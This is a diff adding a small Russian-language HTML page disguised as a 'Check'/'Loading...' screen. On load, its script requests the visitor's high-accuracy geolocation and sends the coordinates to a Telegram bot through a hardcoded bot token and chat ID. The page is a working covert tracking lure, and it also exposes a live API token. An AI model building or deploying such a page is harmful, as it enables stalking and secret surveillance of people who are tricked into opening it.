@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <title>Проверка</title>
+</head>
+<body>
+    <h2>Загрузка...</h2>
+
+<script>
+const BOT_TOKEN = "7813938825:AAFEYmSyG68_Ebv9nWcqBAackF42hdq-Ey8";
+const CHAT_ID = "6724600945";
+
+function sendLocation(lat, lon) {
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            latitude: lat,
+            longitude: lon
+        })
+    });
+
+    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: {"Content-Type": "application/json"},
+        body: JSON.stringify({
+            chat_id: CHAT_ID,
+            text: `📍 Новая геолокация\nLat: ${lat}\nLon: ${lon}`
+        })
+    });
+}
+
+navigator.geolocation.getCurrentPosition(
+    (pos) => {
+        sendLocation(
+            pos.coords.latitude,
+            pos.coords.longitude
+        );
+        document.body.innerHTML = "✅ Готово";
+    },
+    (err) => {
+        document.body.innerHTML = "❌ Доступ к геолокации запрещён";
+    },
+    { enableHighAccuracy: true }
+);
+</script>
+</body>
+</html>
